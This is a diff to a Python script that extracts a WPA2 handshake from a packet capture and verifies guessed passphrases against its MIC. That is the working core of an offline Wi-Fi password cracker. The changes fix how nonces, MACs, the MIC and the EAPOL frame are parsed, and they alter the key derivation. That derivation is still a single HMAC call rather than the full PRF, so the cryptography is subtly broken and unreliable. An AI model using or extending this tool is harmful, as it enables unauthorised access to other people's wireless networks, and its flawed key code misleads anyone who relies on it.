@@ -12,7 +12,7 @@ def derive_psk(ssid, password):
 # MIC verification function
 def verify_mic(psk, anonce, snonce, ap_mac, client_mac, eapol_frame, mic):
     pmk = psk  # Pairwise Master Key (PMK)
-    key_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
+    key_data = b"Pairwise key expansion" + min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
     ptk = hmac.new(pmk, key_data, hashlib.sha1).digest()[:32]  # Pairwise Transient Key (PTK)
     mic_calc = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()[:16]
     return mic_calc == mic
@@ -23,21 +23,22 @@ def extract_handshake(cap_file):
     ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None, None
     
     for packet in cap:
-        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:  # Beacon frame
+        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8 and ssid is None:  # Beacon frame
             ssid = packet.info.decode(errors='ignore')
             print(f"[+] Found SSID: {ssid}")
         
         if packet.haslayer(EAPOL):
             print(f"[+] Found EAPOL frame from {packet.addr2} to {packet.addr1}")
-            if not anonce and packet.FCfield & 2:  # AP to Client (Message 1)
-                anonce = bytes(packet.load[13:45])
+            if anonce is None and packet.FCfield & 2:  # AP to Client (Message 1)
+                anonce = packet.payload.load[13:45]
                 ap_mac = binascii.unhexlify(packet.addr2.replace(':', ''))
                 print(f"[+] Found ANonce: {binascii.hexlify(anonce).decode()}")
-            elif not snonce and packet.FCfield & 1:  # Client to AP (Message 2)
-                snonce = bytes(packet.load[13:45])
+            elif snonce is None and packet.FCfield & 1:  # Client to AP (Message 2)
+                snonce = packet.payload.load[13:45]
                 client_mac = binascii.unhexlify(packet.addr1.replace(':', ''))
-                mic = bytes(packet.load[-18:-2])
-                eapol_frame = bytes(packet.load[:-18]) + b'\x00' * 16  # MIC zeroed
+                mic = packet.payload.load[-18:-2]
+                eapol_frame = packet.payload.load[:]
+                eapol_frame = eapol_frame[:len(eapol_frame) - 18] + b'\x00' * 16  # Zeroing MIC
                 print(f"[+] Found SNonce: {binascii.hexlify(snonce).decode()}")
     
     if all([ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
